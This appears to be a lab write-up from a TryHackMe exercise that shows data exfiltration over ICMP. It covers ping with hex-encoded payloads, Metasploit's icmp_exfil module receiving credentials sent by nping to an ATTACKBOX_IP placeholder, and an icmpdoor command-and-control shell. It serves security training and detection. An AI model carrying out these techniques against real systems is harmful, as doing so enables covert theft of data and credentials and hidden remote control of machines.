# Exfiltration Using ICMP

## Introduction

In this task, we will demonstrate how to exfiltrate data using the ICMP protocol. ICMP (Internet Control Message Protocol) is a network layer protocol used for error reporting. For more information about ICMP and networking fundamentals, visit the TryHackMe room: **What is Networking**.

## ICMP Overview

Network devices like routers use ICMP to check connectivity between devices. Although ICMP is not a transport protocol for data transfer, it can be used to test connectivity using the `ping` command.

### ICMP Request and Reply

- **Echo Request**: Sent by HOST1 to test connectivity.
- **Echo Reply**: Sent by HOST2 to confirm availability.

### ICMP Data Section

The ICMP packet structure includes an optional **Data** section, which can contain strings or other information. Attackers can exploit this section to include data for exfiltration.

---

## Manual ICMP Data Exfiltration

### Using the `ping` Command

The `ping` command, available on most operating systems, can send ICMP packets. On Linux, the `-p` option allows specifying 16 bytes of data in hexadecimal format.

#### Example: Sending Data with `ping`

1. Convert the string `thm:tryhackme` to hexadecimal:
    ```bash
    echo "thm:tryhackme" | xxd -p
    # Output: 74686d3a7472796861636b6d650a
    ```

2. Send the data using `ping`:
    ```bash
    ping 10.10.82.84 -c 1 -p 74686d3a7472796861636b6d650a
    ```

3. Inspect the ICMP packet in Wireshark to verify the data in the **Data** section.

---

## Automated ICMP Data Exfiltration with Metasploit

### Setting Up Metasploit

1. Use the `icmp_exfil` module:
    ```bash
    msf5 > use auxiliary/server/icmp_exfil
    ```

2. Configure the BPF filter to capture ICMP packets:
    ```bash
    set BPF_FILTER icmp and not src ATTACKBOX_IP
    ```

3. Set the network interface:
    ```bash
    set INTERFACE eth0
    run
    ```

### Sending Data from the Victim Machine

1. Log in to the victim machine:
    ```bash
    ssh thm@icmp.thm.com
    ```

2. Send the **BOF** trigger:
    ```bash
    sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
    ```

3. Send the data:
    ```bash
    sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
    sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
    ```

4. Check the Metasploit terminal for the received data.

---

## ICMP Command and Control (C2) Communication

### Using ICMPDoor

1. On the victim machine, run the `icmpdoor` binary:
    ```bash
    sudo icmpdoor -i eth0 -d 192.168.0.133
    ```

2. On the attacker machine, run the `icmp-cnc` binary:
    ```bash
    sudo icmp-cnc -i eth1 -d 192.168.0.121
    ```

3. Send commands and receive responses:
    ```bash
    shell: hostname
    hostname
    shell: icmp-host
    ```

4. Capture ICMP traffic using `tcpdump` to confirm communication:
    ```bash
    sudo tcpdump -i eth0 icmp
    ```

---

## Conclusion

We successfully demonstrated data exfiltration and command execution over the ICMP protocol using manual methods, Metasploit, and the ICMPDoor tool. This highlights the importance of monitoring ICMP traffic for potential misuse.